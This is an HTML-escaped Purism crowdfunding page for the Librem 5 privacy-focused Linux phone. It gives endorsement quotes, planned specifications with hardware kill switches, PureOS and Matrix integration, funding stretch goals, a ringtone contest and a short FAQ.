&lt;p&gt; &lt;br/&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2015/08/purism-todd-weaver-shenzhen-cpu-fusing-options-20150820-300x300.jpeg&quot; alt=&quot;Purism Todd Weaver Shenzhen China CPU Fusing Options&quot; width=&quot;220&quot; class=&quot;alignleft size-medium wp-image-1548&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2015/08/purism-todd-weaver-shenzhen-cpu-fusing-options-20150820-300x300.jpeg 300w, https://puri.sm/wp-content/uploads/2015/08/purism-todd-weaver-shenzhen-cpu-fusing-options-20150820-150x150.jpeg 150w, https://puri.sm/wp-content/uploads/2015/08/purism-todd-weaver-shenzhen-cpu-fusing-options-20150820-100x100.jpeg 100w, https://puri.sm/wp-content/uploads/2015/08/purism-todd-weaver-shenzhen-cpu-fusing-options-20150820.jpeg 700w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;The first version will be capable of voice calling, video, camera, messaging, email, and web browsing, expanding quickly to include the thousands of productivity, gaming, graphics, and photography applications already in PureOS.&lt;/p&gt;
&lt;p&gt;By creating a phone that supports an open community-driven development environment, we can change the future of computing to be respectful of your digital life. (&lt;a href=&quot;https://puri.sm/why-purism/&quot; target=&quot;_blank&quot;&gt;learn more&lt;/a&gt;)&lt;/p&gt;
&lt;hr/&gt;
&lt;hr/&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“I believe digital rights should mirror physical rights, our Librem 5 phone will get humanity closer to that goal.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Todd Weaver, Founder &amp;amp; CEO&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“Computer users are individuals not just consumers. I want people to gain back control of their technical life, I want to empower people!”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Nicole Faerber, Lead Phone Developer&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;“I don’t trust Google because 97% of their revenue is generated by knowing as much as possible about me.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— James Rufer, Director of Product&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;“The idea of a Matrix-native smartphone is unbelievably exciting. Matrix has always aimed to be a decentralised encrypted alternative to the public telephone network, and the Librem 5 makes this all the more true. With truly open communications and a truly open operating system, this is a vision of a world where users are back in control of their communication and their technology, rather than being trapped in proprietary communication silos – a world that cannot come soon enough!&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Matthew Hodgson, Co-founder of Matrix.org&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;“Android is so frustrating! Trying to remove Google’s privacy invasion bit-by-bit removes functionality bit-by-bit, and you end up with a non-working phone. Purism will solve this by putting your privacy protection and security first.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Zlatan Todorić, CTO&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;“From the largest server clusters to the tiniest of phones, computing devices of all sizes should ultimately provide the choice to decide whatever level of privacy and freedom is appropriate for them.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Chris Lamb, Debian Project Leader 2017&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;“It should be our choice on which data we choose to make public. Lack of awareness or understanding of our digital footprint and having others’ benefit from it should not be the norm. Tools, like Librem products and PureOS, are vital to help us manage without needing to become cyber-experts.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;—Helen Vasilevski, Board Member&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;“Currently there is no choice but to put your trust in companies that you don’t want to trust, and this is a problem. The Librem 5 phone will change that, and allow you to control your own life.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Youness Alaoui, Hardware Enablement Engineer&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;“This is MY phone!”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Theodotos Andreou, System Administrator&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;“I am very pleased to see Purism considering to use, support, and advance GNOME on mobile devices.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Neil McGovern, Executive Director, GNOME Foundation&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“Partnering with Purism will allow us to ready Plasma Mobile for the real world and integrate it seamlessly with a commercial device for the first time. The Librem 5 will make Plasma Mobile shine the way it deserves.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Lydia Pintscher, President of KDE e.V.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;“I am very excited about having a phone that only runs free and open source software. Not only is it a great win for users now having full control over their devices and their privacy, but it also enables the community to develop on a smartphone platform without restrictions, which opens the door for novel ideas and innovation on these devices.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Matthias Klumpp&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“I trust freedoms governed by democratic transparent power structures. My current phone runs Free code – my next phone will be trustworthy.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Jonas Smedegaard, Debian developer and PureOS developer&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;“Do I want a phone I can finally trust, and doubles as a convergence developer board? Was Grace Hopper a rear admiral?!”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— David Seaward, Lead developer (Purist services)&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;“Planned obsolescence of Android and iPhones made me understand how important the free software movement is for everyone. Now, I refuse to buy another phone that I do not control and am not the owner of.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— François Téchené, Director of Creative&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;“Purism has been doing genuine and important work around making truly free yet desirable laptops. The communities I work with would very much like to see the same philosophy replicated in a phone that runs a GNOME based stack where community members can participate in equal terms and that ensures respect for the users’ privacy and security. While pulling this off is hard, Todd seems like someone who sincerely cares about these issues and has a great track record executing, I think the efforts of Purism deserve the support of the free software community.”&lt;br/&gt;&lt;span class=&quot;author&quot;&gt;— Alberto Ruiz, GNOME &amp;amp; Fedora Laptop Enablement&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr/&gt;
&lt;p&gt;We have assembled a world-class global team, in over 15 countries, united in one common goal to make computing devices that respect digital rights. We have specialties that include mobile development, mobile communications, hardware manufacturing, software security, privacy protection, and free software. We are passionately devoted to security, privacy, and digital rights for users, and this shows clearly in all our products.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;We have partnered with the Core development team from Matrix, and are excited to be able to incorporate the amazing talents from this remarkable team into the core communications of the Librem 5!&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/phone-turn-around-kde-1024x576.png&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;540&quot; class=&quot;alignnone size-large wp-image-31646&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/phone-turn-around-kde-1024x576.png 1024w, https://puri.sm/wp-content/uploads/2017/08/phone-turn-around-kde-300x169.png 300w, https://puri.sm/wp-content/uploads/2017/08/phone-turn-around-kde-768x432.png 768w, https://puri.sm/wp-content/uploads/2017/08/phone-turn-around-kde.png 1280w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The Librem 5 is a 5″ phone that carries with it a social revolution, where we the people can stand up for our digital rights, we can say “We want to control our phone and keep our own data. We refuse to financially back the wholesale gathering of our digital life. We no longer will allow unfettered access to our photos, videos, email, text messages, applications and usage data.” By using a Librem 5 phone you are standing up for the future of phone privacy, you are supporting an open community-driven development environment, where all the source code can be used, re-purposed, and shared to improve society. By backing this campaign, you are voting with your wallet to support a future where people can be protected, feel safe, and participate in a respectful culture.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;The Librem 5 can be used in any of three ways:&lt;/p&gt;
&lt;ol class=&quot;bullets&quot;&gt;&lt;li&gt;With a cellular carrier provided phone number, data plan, and WiFi&lt;/li&gt;
&lt;li&gt;With a cellular carrier data plan, and WiFi&lt;/li&gt;
&lt;li&gt;With no carrier, and using only WiFi&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;WiFi calling and VoIP calling will be able to be provided in WiFi or data plan modes. We expect to offer call-out, and call-in with phone numbers in all of these plans as well. If you still require a “traditional” phone number through a carrier and want to make unencrypted phone calls or messaging, it will be an option you can choose, but is not required (we recommend avoiding unencrypted phone calls).&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/06/phone-exploded-1-300x225.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;225&quot; class=&quot;alignleft size-medium wp-image-21031&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/06/phone-exploded-1-300x225.png 300w, https://puri.sm/wp-content/uploads/2017/06/phone-exploded-1-768x576.png 768w, https://puri.sm/wp-content/uploads/2017/06/phone-exploded-1.png 800w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;Starting with a metal case, high resolution screen, and multifunction port, we heard your feedback, know what you want, since we want it too. The specifications are continuing to get pinned down, and will not be finalized until after the campaign ends, so please share what you’d like to see, and we will evaluate all design feedback that aligns with our beliefs.&lt;/p&gt;
&lt;p&gt; &lt;br/&gt; &lt;br/&gt;The CPU will be an i.MX 6 or i.MX 8, where we can separate the baseband modem from the main CPU, digging deeper and deeper to protect your privacy and isolate components for a strong security hardware stack.&lt;/p&gt;
&lt;p&gt; &lt;br/&gt; &lt;br/&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/phonescreenkeyboardmouse-2-1024x576.jpg&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;540&quot; class=&quot;alignnone size-large wp-image-24734&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/phonescreenkeyboardmouse-2-1024x576.jpg 1024w, https://puri.sm/wp-content/uploads/2017/08/phonescreenkeyboardmouse-2-300x169.jpg 300w, https://puri.sm/wp-content/uploads/2017/08/phonescreenkeyboardmouse-2-768x432.jpg 768w, https://puri.sm/wp-content/uploads/2017/08/phonescreenkeyboardmouse-2.jpg 1280w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Enabling the path for a true convergence device, capable to work as a phone, making video and audio calls, encrypted messaging, email, web browser, that can also become a full desktop computer with an option for a compatible keyboard, mouse, and monitor. It can be a desktop computer and phone all-in-one.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-20760&quot; src=&quot;https://puri.sm/wp-content/uploads/2017/08/technology-stack-logos-2017-08-24.png&quot; alt=&quot;Linux, GNU, GNOME, GTK, KDE, Plasma, Debian, PureOS, Flatpak, Matrix, HTML5&quot; width=&quot;798&quot; height=&quot;104&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/09/librem5-gnome-kde-diversity-1024x603.jpg&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;565&quot; class=&quot;aligncenter size-large wp-image-28068&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/09/librem5-gnome-kde-diversity-1024x603.jpg 1024w, https://puri.sm/wp-content/uploads/2017/09/librem5-gnome-kde-diversity-300x177.jpg 300w, https://puri.sm/wp-content/uploads/2017/09/librem5-gnome-kde-diversity-768x452.jpg 768w, https://puri.sm/wp-content/uploads/2017/09/librem5-gnome-kde-diversity.jpg 1280w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-kde-dialer-238x300.png&quot; alt=&quot;&quot; width=&quot;200&quot; class=&quot;alignright size-full wp-image-31652&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-kde-dialer-238x300.png 238w, https://puri.sm/wp-content/uploads/2017/08/librem5-kde-dialer.png 540w&quot; sizes=&quot;(max-width: 238px) 100vw, 238px&quot;/&gt;PureOS will ship by default, an isolation based security focused operating system, where all the source code is available. PureOS, like Ubuntu, Debian, and Red Hat, runs a Linux Kernel and utilizes the GNU operating system tools that power billions of users on a daily basis. PureOS strives for the strictest of security and privacy protection, by releasing all the source code, and offering safe security and privacy defaults, as well as avoiding common security threats, such as ransomware, and data mining tools.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/mail.png&quot; alt=&quot;&quot; width=&quot;350&quot; class=&quot;alignleft size-medium wp-image-24697&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/mail.png 640w, https://puri.sm/wp-content/uploads/2017/08/mail-300x150.png 300w&quot; sizes=&quot;(max-width: 640px) 100vw, 640px&quot;/&gt;PureOS on the Librem 5 initially, upon shipment, will offer basic communication services: phone, email, messaging, voice, camera, browsing, and will expand after shipment and over time to more free software applications, through shared collaboration with the developer community (not “read-only open source”, but true free software collaboration).&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;Partnering with &lt;a href=&quot;http://matrix.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Matrix&lt;/a&gt; Librem 5 is the first ever Matrix-powered smartphone, natively using end-to-end encrypted decentralised communication in its dialer and messaging app.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://matrix.org/blog/wp-content/uploads/2015/01/logo1.png&quot; width=&quot;279&quot; height=&quot;129&quot; class=&quot;aligncenter size-large&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Matrix is an open ecosystem for interoperable encrypted communication, supporting a rapidly growing community of over 2 million users for VoIP and Slack-style messaging. Allowing you to easily communicate securely to any Internet connected device, including iOS, Android, Windows, OSX, or GNU+Linux machines. Having a native communication suite which allows for Calling, Text Messaging, Group Messaging, and Video Calling is the future of communication.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/browser.png&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;360&quot; class=&quot;alignnone size-full wp-image-24703&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/browser.png 960w, https://puri.sm/wp-content/uploads/2017/08/browser-300x113.png 300w, https://puri.sm/wp-content/uploads/2017/08/browser-768x288.png 768w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;br/&gt; &lt;br/&gt;Purism’s Librem 5 phone will be able to run HTML5 applications, which means common applications you use everyday will be available through the web browser. Purism will be able to isolate these applications from the OS, so the applications will not be able to have visibility into other running applications or have access to areas that you do not allow.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-distros-1024x683.png&quot; alt=&quot;&quot; width=&quot;500&quot; class=&quot;alignright size-large wp-image-24704&quot;/&gt;&lt;/p&gt;
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;PureOS&lt;/li&gt;
&lt;li&gt;Debian GNU/Linux&lt;/li&gt;
&lt;li&gt;Ubuntu&lt;/li&gt;
&lt;li&gt;Fedora&lt;/li&gt;
&lt;li&gt;Suse&lt;/li&gt;
&lt;li&gt;Arch Linux | ARM&lt;/li&gt;
&lt;li&gt;SubgraphOS&lt;/li&gt;
&lt;/ul&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/compatibility-1024x576.png&quot; alt=&quot;&quot; width=&quot;500&quot; class=&quot;alignright size-large wp-image-24705&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/compatibility-1024x576.png 1024w, https://puri.sm/wp-content/uploads/2017/08/compatibility-300x169.png 300w, https://puri.sm/wp-content/uploads/2017/08/compatibility-768x432.png 768w, https://puri.sm/wp-content/uploads/2017/08/compatibility.png 1280w&quot; sizes=&quot;(max-width: 1024px) 100vw, 1024px&quot;/&gt;&lt;/p&gt;
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;Librem Laptops&lt;/li&gt;
&lt;li&gt;Monitor, Keyboard, Mouse&lt;/li&gt;
&lt;li&gt;WiFi&lt;/li&gt;
&lt;li&gt;BlueTooth&lt;/li&gt;
&lt;li&gt;3G/4G/LTE&lt;/li&gt;
&lt;li&gt;Apple iOS&lt;/li&gt;
&lt;li&gt;Apple OSX&lt;/li&gt;
&lt;li&gt;Android&lt;/li&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;li&gt;GNU/Linux&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;p&gt;This device is for anybody and everybody interested in protecting his/her data, communicating privately to your loved ones, or supporting a future of protecting your digital rights.&lt;/p&gt;
&lt;h3&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-family-300x283.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;283&quot; class=&quot;alignleft size-medium wp-image-24710&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-family-300x283.png 300w, https://puri.sm/wp-content/uploads/2017/08/librem5-call-family.png 720w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;Parents&lt;/h3&gt;
&lt;p&gt;Parents will love the Librem 5 because it will allow you to communicate with your child, while having peace of mind that they are not being compromised or tracked without your permission.&lt;/p&gt;
&lt;h3&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-devs-300x175.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;175&quot; class=&quot;alignright size-medium wp-image-24711&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-devs-300x175.png 300w, https://puri.sm/wp-content/uploads/2017/08/librem5-call-devs.png 720w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;Developers&lt;/h3&gt;
&lt;p&gt;Developers will love the Librem 5 because it will allow you to control your software and do what you’d like with a phone device.&lt;/p&gt;
&lt;h3&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-business-300x283.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;283&quot; class=&quot;alignleft size-medium wp-image-24712&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/librem5-call-business-300x283.png 300w, https://puri.sm/wp-content/uploads/2017/08/librem5-call-business.png 720w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;Enterprises &amp;amp; Businesses&lt;/h3&gt;
&lt;p&gt;Enterprises will love the Librem 5 because it will allow them to have a security focused phone that is immune to common threats and protects their data by default.&lt;/p&gt;
&lt;p&gt;Business Professionals will love the Librem 5 because it will give them the peace of mind that they have the best security and privacy protection built-in.&lt;/p&gt;
&lt;h3&gt;Technology lovers&lt;/h3&gt;
&lt;p&gt;CTOs/CIOs/IT will love the Librem 5 because all the source code is available for audit, and they can tightly integrate whatever configuration the corporation requires.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;The specs will be finalized as late as efficiently possible to ensure the best available components. The hardware will run almost any GNU+Linux based distribution, and it will also work with 2G/3G/4G, GSM, UMTS, and LTE networks.&lt;/p&gt;
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;5″ touchscreen&lt;/li&gt;
&lt;li&gt;i.MX 6 or i.MX 8 CPU (we’re already &lt;a href=&quot;https://puri.sm/posts/librem5-roadmap-to-imx8/&quot; target=&quot;_blank&quot;&gt;making progress on our roadmap to i.MX 8&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Vivante GPU (Etnaviv free software accelerated driver)&lt;/li&gt;
&lt;li&gt;Separate mobile baseband&lt;/li&gt;
&lt;li&gt;3GB LPDDR3&lt;/li&gt;
&lt;li&gt;32GB eMMC&lt;/li&gt;
&lt;li&gt;MicroSD slot&lt;/li&gt;
&lt;li&gt;Camera (front and back)&lt;/li&gt;
&lt;li&gt;Flash&lt;/li&gt;
&lt;li&gt;Headphone and Microphone Jack (3.5mm)&lt;/li&gt;
&lt;li&gt;Microphone&lt;/li&gt;
&lt;li&gt;Speaker&lt;/li&gt;
&lt;li&gt;Power Button&lt;/li&gt;
&lt;li&gt;Volume Controls&lt;/li&gt;
&lt;li&gt;SIM Slot&lt;/li&gt;
&lt;li&gt;WiFi 802.11&lt;/li&gt;
&lt;li&gt;Bluetooth 4&lt;/li&gt;
&lt;li&gt;Debugging interface (internal)&lt;/li&gt;
&lt;li&gt;USB Host&lt;/li&gt;
&lt;li&gt;USB Type-C&lt;/li&gt;
&lt;li&gt;Battery&lt;/li&gt;
&lt;li&gt;Sensors:
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;GPS&lt;/li&gt;
&lt;li&gt;Accelerometer&lt;/li&gt;
&lt;li&gt;Gyroscope&lt;/li&gt;
&lt;li&gt;Compass&lt;/li&gt;
&lt;li&gt;Ambient Light&lt;/li&gt;
&lt;li&gt;Proximity&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Hardware kill switches for:
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;Camera&lt;/li&gt;
&lt;li&gt;Microphone&lt;/li&gt;
&lt;li&gt;Baseband&lt;/li&gt;
&lt;li&gt;WiFi/Bluetooth&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;subject-to-change&quot;&gt;*Specifications are subject to change.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/06/mobo_640-300x169.png&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;169&quot; class=&quot;alignright size-medium wp-image-21030&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/06/mobo_640-300x169.png 300w, https://puri.sm/wp-content/uploads/2017/06/mobo_640.png 640w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The developer kit includes:&lt;/p&gt;
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;screen + touchscreen&lt;/li&gt;
&lt;li&gt;development mainboard&lt;/li&gt;
&lt;li&gt;cabling&lt;/li&gt;
&lt;li&gt;power supply&lt;/li&gt;
&lt;li&gt;some critical components as modules:
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;camera&lt;/li&gt;
&lt;li&gt;baseband modem&lt;/li&gt;
&lt;li&gt;WiFi&lt;/li&gt;
&lt;li&gt;GPS&lt;/li&gt;
&lt;li&gt;various sensors&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p class=&quot;subject-to-change&quot;&gt;*Specifications are subject to change.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;After funding is completed, we will prepare the hardware design, manufacture developer units and get those into the hands of all the developers and backers of the development kit, so we can work on the software and full hardware roll-out in parallel. Once we confirm the basics from these developer units, we will update the hardware design and begin production. Learning from experience, we are giving ourselves time to develop and follow the hardware trends to deliver to you the ideal phone product running the most rights-respecting software available.&lt;/p&gt;
&lt;p&gt;The product that ships to backers will be finalized phone hardware that can make a phone call, check email, browse the web, make a video call, and take a photo. This is designed to start as an encrypted communication device, and expand, after shipment, over time, to include all the productivity and software common on existing phone and desktop operating systems.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;The Librem 5 phone started a little over 1.5 years ago, selecting hardware that would work to create a PureOS based phone, that would not rely upon Android. We have added team members to do all the research and development, and after testing the hardware to confirm we can meet our goals, we are now at the point of seeking preorders to prove the demand and fund the manufacturing.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-20761&quot; src=&quot;https://puri.sm/wp-content/uploads/2017/06/purism-librem-5-phone-planner.png&quot; alt=&quot;Purism Librem 5 phone planner&quot; width=&quot;800&quot; height=&quot;489&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/06/purism-librem-5-phone-planner.png 800w, https://puri.sm/wp-content/uploads/2017/06/purism-librem-5-phone-planner-300x183.png 300w, https://puri.sm/wp-content/uploads/2017/06/purism-librem-5-phone-planner-768x469.png 768w&quot; sizes=&quot;(max-width: 800px) 100vw, 800px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;As you can see from the gantt chart above, we expect to use the funds from this preorder campaign to fabricate the development units, manufacture the phone, port/develop the OS, and develop the communication applications. This is a lot of work to accomplish, and we are both allotting enough time to get this all done, and putting a call out for quality, eager, free software developers to add to our phone development team (see our &lt;a title=&quot;Join the Purism team&quot; href=&quot;https://puri.sm/jobs/&quot; target=&quot;_blank&quot;&gt;jobs&lt;/a&gt; page for more information).&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;After the Librem 5 ships to customers, we will continue to improve the software by adding common and requested applications such as calendar, notes, calculator, pdf viewer, etc. Since this is a free software phone where all the source code and packages are available, we would expect to see developers creating their own applications, porting existing applications, and improving the overall “app store” experience. If you are a developer interested and wanting to port your application, we will be creating a community area to participate in PureOS mobile development. You can find out more about PureOS at &lt;a href=&quot;https://pureos.net&quot; target=&quot;_blank&quot;&gt;PureOS.net&lt;/a&gt;.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;Like any great endeavor, we have some lofty goals that &lt;strong&gt;could&lt;/strong&gt; be accomplished with enough funding, so we have included our dream roadmap below. Applying funding targets to each goal, allows us to share the stretch goals and see just how far we can go with the product, based on user support:&lt;/p&gt;
&lt;p&gt;$4m &lt;span&gt;= VOIP phone number, call-in, call-out features&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;$6m &lt;span&gt;= Reverse engineering faster WiFi/BT firmware&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;$8m &lt;span&gt;= Free encrypted VPN tunnel service for all backers for 1 year&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;$10m &lt;span&gt;= Run Android applications in isolation on Librem 5&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;$20m &lt;span&gt;= FUN GOAL, Candy Crush (clone) 🙂 available for free&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;$32m &lt;span&gt;= FUN GOAL, “We did it!”(polite reference to Ubuntu Edge goal)&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;We want to hear from you, literally! We want to have a unique Purism Librem 5 ringtone, and will give-away (or refund an existing order for) a Librem 5 to the winner(s) of the Ringtone contest!&lt;/p&gt;
&lt;p&gt;What we would like is a free format ringtones for; power-on, phone call, text message, video call, and email notification. We will refund any existing order, or give-away a Librem 5 to whomever we select in any of those categories (so yes, it could be one winner, or could be 5).&lt;/p&gt;
&lt;p&gt;Please submit your free format sound clips via email to &lt;a href=&quot;mailto:info@puri.sm&quot;&gt;info@puri.sm&lt;/a&gt; with the subject “Ringtone Contest submission”, please provide the files under a &lt;a href=&quot;https://en.wikipedia.org/wiki/Definition_of_Free_Cultural_Works&quot; target=&quot;_blank&quot;&gt;free cultural work license&lt;/a&gt;, please name the files or reference the file names to the categories mentioned above. (e.g. purism-librem-5_email-at-domain_power-on.flac ).&lt;/p&gt;
&lt;p&gt;The winner(s) of the ringtone contest will be decided November 1st, 2017 by a vote of the Purism team members.&lt;/p&gt;
&lt;hr/&gt;
&lt;p&gt;Although our core business is hardware, software, and services, and having spent the last 18 months doing phone research, there are still risks. We’ve partnered with one of the largest phone manufacturers in the world to produce the case, and fabricate the motherboard from our specifications, and of course sourcing the screen, battery, and power supply. We have a worldwide team to address all that we need; from mainland China manufacturing, Hong Kong exporting, South San Francisco USA assembly, European reseller, and a Worldwide developer network. We’re excited and ready for the journey from this campaign to delivered phone.&lt;/p&gt;
&lt;p&gt;One reason for setting the funding goal at our target is to mitigate risk of research and development, and to have some padding for delays, errors, and issues that arise during any new manufacturing project.&lt;/p&gt;
&lt;p&gt;Finally, because we will be making some hardware and chipset changes during the development process, this will introduce changes in software or drivers. The good news it that since we believe what you believe, you will end up with a high-quality phone that protects you by default no matter the version of a given chip.&lt;/p&gt;
&lt;hr/&gt;
&lt;h5&gt;Do I need to add the cost of shipping to my pledge?&lt;/h5&gt;
&lt;p&gt;We offer free worldwide shipping on orders, so there is no need to add any shipping.&lt;/p&gt;
&lt;h5&gt;Do you have a German or UK/EU Reseller?&lt;/h5&gt;
&lt;p&gt;Yes, we have partnered with a German reseller, and will be shipping all German (and UK/EU orders) from Germany.&lt;/p&gt;
&lt;h5&gt;Can I run Android apps?&lt;/h5&gt;
&lt;p&gt;Not day 1. However there is a lot of interest in including a isolation layer that will be able to power Android applications natively. We have added that as a stretch goal to quantify the effort.&lt;/p&gt;
